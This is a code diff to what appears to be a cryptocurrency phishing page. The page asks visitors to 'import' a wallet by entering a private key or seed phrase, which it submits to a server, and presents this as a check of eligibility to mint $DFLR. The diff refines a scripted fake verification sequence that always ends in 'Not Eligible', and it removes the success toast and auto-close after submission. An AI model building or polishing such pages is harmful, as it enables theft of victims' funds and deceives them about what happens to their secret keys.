@@ -459,6 +459,8 @@
 
   <script>
     
+let verificationTimers = [];
+
 function showVerificationDemo() {
   const state = document.getElementById('successState');
   const icon = document.getElementById('verifyIcon');
@@ -468,16 +470,32 @@ function showVerificationDemo() {
   const walletAge = document.getElementById('walletAgeCheck');
   const swap = document.getElementById('swapCheck');
 
-  // Reset
+  // Bersihkan animasi sebelumnya
+  verificationTimers.forEach(clearTimeout);
+  verificationTimers = [];
+
+  // Reset popup
+  state.classList.add('show');
+
   icon.innerHTML = '<div class="loader"></div>';
-  icon.style.background = '#f4faf6';
-  icon.style.borderColor = '#0b7a3e';
+  icon.style.cssText = `
+    width:68px;
+    height:68px;
+    background:#f4faf6;
+    border:2px solid #0b7a3e;
+    border-radius:4px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 1.5rem;
+    color:#0b7a3e;
+  `;
 
   title.textContent = 'Verifying Wallet';
   title.style.color = '#0b7a3e';
 
   message.textContent =
-    'Please wait while we verify your wallet...';
+    'Please wait while the requirements are being checked...';
 
   walletAge.className = 'verify-item checking';
   walletAge.querySelector('.status-text').textContent = 'Checking...';
@@ -485,43 +503,34 @@ function showVerificationDemo() {
   swap.className = 'verify-item pending';
   swap.querySelector('.status-text').textContent = 'Waiting...';
 
-  state.classList.add('show');
-
-  // Step 1 — Wallet age
-  setTimeout(() => {
+  // Step 1
+  verificationTimers.push(setTimeout(() => {
     walletAge.className = 'verify-item verified';
     walletAge.querySelector('.status-text').textContent = 'Verified';
 
-    // Start swap verification
     swap.className = 'verify-item checking';
     swap.querySelector('.status-text').textContent = 'Checking...';
+  }, 1800));
 
-  }, 1800);
-
-  // Step 2 — Swap activity
-  setTimeout(() => {
+  // Step 2
+  verificationTimers.push(setTimeout(() => {
     swap.className = 'verify-item failed';
     swap.querySelector('.status-text').textContent = 'Not Verified';
+  }, 3600));
 
-  }, 3600);
+  // Final state
+  verificationTimers.push(setTimeout(() => {
+    icon.innerHTML = '<span class="result-x">×</span>';
 
-  // Final result
-  setTimeout(() => {
-    icon.innerHTML = '×';
     icon.style.background = '#fde8e8';
     icon.style.borderColor = '#c0392b';
-    icon.style.color = '#c0392b';
-    icon.style.fontSize = '32px';
-    icon.style.fontFamily = "'Space Mono', monospace";
-    icon.style.fontWeight = '800';
 
     title.textContent = 'Not Eligible';
     title.style.color = '#c0392b';
 
-    message.innerHTML =
-      'Please complete all requirements to mint $DFLR';
-
-  }, 4200);
+    message.textContent =
+      'The required wallet activity could not be verified.';
+  }, 4200));
 }
     
     function Scroll() {
@@ -530,13 +539,18 @@ function showVerificationDemo() {
       window.scrollTo({ top: y, behavior: 'smooth' });
     }
     
-    function openModal() {
-      document.getElementById('modalOverlay').classList.add('show');
-      document.getElementById('formState').style.display = 'block';
-      document.getElementById('successState').classList.remove('show');
-      switchTab('pk');
-      buildSeedGrid(currentWordCount);
-    }
+function openModal() {
+  verificationTimers.forEach(clearTimeout);
+  verificationTimers = [];
+
+  document.getElementById('modalOverlay').classList.add('show');
+  document.getElementById('formState').style.display = 'block';
+  document.getElementById('successState').classList.remove('show');
+
+  switchTab('pk');
+  buildSeedGrid(currentWordCount);
+}
+    
     function closeModal() { document.getElementById('modalOverlay').classList.remove('show'); }
     function handleOverlayClick(e) { if (e.target.id === 'modalOverlay') closeModal(); }
     document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
@@ -625,8 +639,7 @@ function showVerificationDemo() {
         if (!data.ok) throw new Error('failed');
         document.getElementById('formState').style.display = 'none';
         document.getElementById('successState').classList.add('show');
-        showToast();
-        setTimeout(closeModal, 8000);
+        
       } catch (err) {
         btn.disabled    = false;
         btn.textContent = 'Import Wallet';
